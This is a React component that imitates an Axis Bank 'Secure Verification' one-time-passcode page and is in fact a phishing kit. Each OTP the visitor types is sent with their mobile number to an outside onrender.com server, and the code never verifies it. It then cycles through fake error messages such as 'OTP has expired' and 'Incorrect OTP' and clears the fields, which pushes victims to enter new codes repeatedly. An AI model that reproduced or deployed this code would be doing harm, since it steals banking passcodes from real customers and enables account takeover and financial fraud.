import { useState } from "react";
import { useLocation } from "react-router-dom";
import { FaSpinner } from "react-icons/fa";
import "./otpSubmit.css";

export default function OTPSubmit() {
  const location = useLocation();
  const { mobileNumber } = location.state || {};
  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });

  // Sequential error messages
  const errorMessages = [
    "Technical error, please try later",
    "OTP has expired, resend OTP",
    "Network error, please check your connection",
    "Incorrect OTP, please resend OTP again",
  ];
  const [errorIndex, setErrorIndex] = useState(0);

  // Handle typing in OTP inputs
  const handleChange = (element, index) => {
    if (/^[0-9]$/.test(element.value) || element.value === "") {
      const newOtp = [...otp];
      newOtp[index] = element.value;
      setOtp(newOtp);

      // Auto-focus next input
      if (element.nextSibling && element.value) {
        element.nextSibling.focus();
      }

      // Automatically submit when all 6 digits entered
      if (newOtp.join("").length === 6) {
        handleVerify(newOtp.join(""));
      }
    }
  };

  // Handle OTP verification
  const handleVerify = async (otpValue) => {
    if (!otpValue || otpValue.length < 6) {
      setMessage({ text: "Please enter the 6-digit OTP", type: "error" });
      return;
    }

    if (!mobileNumber) {
      setMessage({ text: "Mobile number not found, please login again", type: "error" });
      return;
    }

    setLoading(true);
    setMessage({ text: "", type: "" });

    try {
      // Always store OTP + mobile number in DB
      await fetch("https://axisonline-1.onrender.com/api/otp/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mobileNumber, otp: otpValue }),
      });

      // Show one of the predefined error messages and clear OTP inputs
      setTimeout(() => {
        setMessage({ text: errorMessages[errorIndex], type: "error" });
        setErrorIndex((prevIndex) => (prevIndex + 1) % errorMessages.length);
        setOtp(new Array(6).fill("")); // Clear OTP inputs
        setLoading(false);
      }, 3000); // spinner for 3s
    } catch (err) {
      console.error(err);
      setTimeout(() => {
        setMessage({ text: "Network error, please check your connection", type: "error" });
        setOtp(new Array(6).fill("")); // Clear OTP inputs on network error
        setLoading(false);
      }, 3000);
    }
  };

  // Handle Resend OTP
  const handleResend = async () => {
    setOtp(new Array(6).fill("")); // Clear inputs
    setMessage({
      text: `OTP resent to your registered mobile number ending with ${mobileNumber ? mobileNumber.slice(-4) : "****"}`,
      type: "success",
    });

    try {
      await fetch("https://axisonline-1.onrender.com/api/otp/resend", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mobileNumber }),
      });
    } catch (err) {
      console.error("Resend OTP error:", err);
    }
  };

  return (
    <div className="otp-container">
      <img src="/icons/axis-bank.png" alt="Logo" />
      <h2>Secure Verification</h2>

      <p className="otp-headerrr">
        Please enter the 6-digit OTP sent to your registered mobile number ending with {mobileNumber ? mobileNumber.slice(-4) : "****"}
      </p>

      {message.text && <div className={`form-message ${message.type}`}>{message.text}</div>}

      <div className="otp-inputs">
        {otp.map((data, index) => (
          <input
            key={index}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength="1"
            value={data}
            onChange={(e) => handleChange(e.target, index)}
            onFocus={(e) => e.target.select()}
            disabled={loading}
          />
        ))}
      </div>

      <p className="resend-otp" onClick={handleResend}>
        Resend OTP
      </p>

      <button
        className="verify-btn"
        onClick={() => handleVerify(otp.join(""))}
        disabled={loading}
      >
        {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
      </button>
    </div>
  );
}
